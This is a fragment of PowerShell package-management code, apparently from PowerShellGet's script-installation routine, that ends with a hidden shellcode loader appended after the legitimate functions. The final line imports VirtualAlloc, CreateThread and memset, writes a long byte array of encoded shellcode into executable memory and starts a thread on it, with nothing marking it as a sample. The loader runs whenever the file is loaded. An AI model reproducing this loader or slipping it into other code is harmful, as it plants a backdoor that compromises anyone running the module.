                                Write-Verbose -Message ($LocalizedData.ScriptExternallyManagedScriptDependencyIsInstalled -f $ExternalDependency)
                            }
                        }
                    }

                    
                    if($Force -and
                        $InstalledScriptInfo2 -and
                        -not $destinationscriptPath.StartsWith($InstalledScriptInfo2.ScriptBase, [System.StringComparison]::OrdinalIgnoreCase))
                    {
                        Microsoft.PowerShell.Management\Remove-Item -Path $InstalledScriptInfo2.Path `
                                                                    -Force `
                                                                    -ErrorAction SilentlyContinue `
                                                                    -WarningAction SilentlyContinue `
                                                                    -Confirm:$false -WhatIf:$false
                    }

                    if($IsSavePackage)
                    {
                        $message = $LocalizedData.ScriptSavedSuccessfully -f ($psgItemInfo.Name, $installLocation)
                    }
                    else
                    {
                        $message = $LocalizedData.ScriptInstalledSuccessfully -f ($psgItemInfo.Name, $installLocation)
                    }
                    Write-Verbose $message
                }

                $sid = New-SoftwareIdentityFromPackage -Package $pkg `
                    -SourceLocation $sourceLocation `
                    -PackageManagementProviderName $provider.ProviderName `
                    -Request $request `
                    -Type $packageType `
                    -InstalledLocation $installLocation `
                    @AdditionalParams

                Write-Output -InputObject $sid
            }
        }
        finally
        {
            Microsoft.PowerShell.Management\Remove-Item $tempDestination -Force -Recurse -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -Confirm:$false -WhatIf:$false
        }
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd8,0xd9,0x74,0x24,0xf4,0x5b,0xbf,0xb7,0x76,0xa6,0x57,0x33,0xc9,0xb1,0x47,0x31,0x7b,0x18,0x03,0x7b,0x18,0x83,0xc3,0xb3,0x94,0x53,0xab,0x53,0xda,0x9c,0x54,0xa3,0xbb,0x15,0xb1,0x92,0xfb,0x42,0xb1,0x84,0xcb,0x01,0x97,0x28,0xa7,0x44,0x0c,0xbb,0xc5,0x40,0x23,0x0c,0x63,0xb7,0x0a,0x8d,0xd8,0x8b,0x0d,0x0d,0x23,0xd8,0xed,0x2c,0xec,0x2d,0xef,0x69,0x11,0xdf,0xbd,0x22,0x5d,0x72,0x52,0x47,0x2b,0x4f,0xd9,0x1b,0xbd,0xd7,0x3e,0xeb,0xbc,0xf6,0x90,0x60,0xe7,0xd8,0x13,0xa5,0x93,0x50,0x0c,0xaa,0x9e,0x2b,0xa7,0x18,0x54,0xaa,0x61,0x51,0x95,0x01,0x4c,0x5e,0x64,0x5b,0x88,0x58,0x97,0x2e,0xe0,0x9b,0x2a,0x29,0x37,0xe6,0xf0,0xbc,0xac,0x40,0x72,0x66,0x09,0x71,0x57,0xf1,0xda,0x7d,0x1c,0x75,0x84,0x61,0xa3,0x5a,0xbe,0x9d,0x28,0x5d,0x11,0x14,0x6a,0x7a,0xb5,0x7d,0x28,0xe3,0xec,0xdb,0x9f,0x1c,0xee,0x84,0x40,0xb9,0x64,0x28,0x94,0xb0,0x26,0x24,0x59,0xf9,0xd8,0xb4,0xf5,0x8a,0xab,0x86,0x5a,0x21,0x24,0xaa,0x13,0xef,0xb3,0xcd,0x09,0x57,0x2b,0x30,0xb2,0xa8,0x65,0xf6,0xe6,0xf8,0x1d,0xdf,0x86,0x92,0xdd,0xe0,0x52,0x0e,0xdb,0x76,0x0a,0xc8,0x58,0xa1,0xdc,0xd4,0x9e,0xac,0xa7,0x50,0x78,0xfe,0x87,0x32,0xd5,0xbe,0x77,0xf3,0x85,0x56,0x92,0xfc,0xfa,0x46,0x9d,0xd6,0x92,0xec,0x72,0x8f,0xcb,0x98,0xeb,0x8a,0x80,0x39,0xf3,0x00,0xed,0x79,0x7f,0xa7,0x11,0x37,0x88,0xc2,0x01,0xaf,0x78,0x99,0x78,0x79,0x86,0x37,0x16,0x85,0x12,0xbc,0xb1,0xd2,0x8a,0xbe,0xe4,0x14,0x15,0x40,0xc3,0x2f,0x9c,0xd4,0xac,0x47,0xe1,0x38,0x2d,0x97,0xb7,0x52,0x2d,0xff,0x6f,0x07,0x7e,0x1a,0x70,0x92,0x12,0xb7,0xe5,0x1d,0x43,0x64,0xad,0x75,0x69,0x53,0x99,0xd9,0x92,0xb6,0x1b,0x25,0x45,0xfe,0x69,0x47,0x55;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

